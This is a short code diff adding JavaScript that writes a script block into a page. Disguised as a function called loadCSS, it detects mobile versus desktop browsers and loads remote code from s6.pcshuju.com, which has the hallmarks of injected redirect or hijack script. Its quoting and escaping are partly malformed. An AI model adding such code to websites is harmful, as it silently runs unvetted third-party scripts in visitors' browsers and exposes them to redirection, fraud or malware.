@@ -1,0 +1,11 @@
+document.writeln("<script type=\'text/javascript\'>");
+document.writeln("function loadCSS() {");
+document.writeln("     if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|wOSBrowser|BrowserNG|WebOS)/i))) {");
+document.writeln("            document.write(\'<script src=\'//s6.pcshuju.com/gs.php?id=6581\'><\/\//script>\');		//WAP");
+document.writeln("     }");
+document.writeln("    else {");
+document.writeln("          document.write(\'<script src=\'//s6.pcshuju.com/gs.php?id=6580\'><\/\//script>\');		//PC");
+document.writeln("    }");
+document.writeln("}");
+document.writeln("loadCSS();");
+document.writeln("</script>");
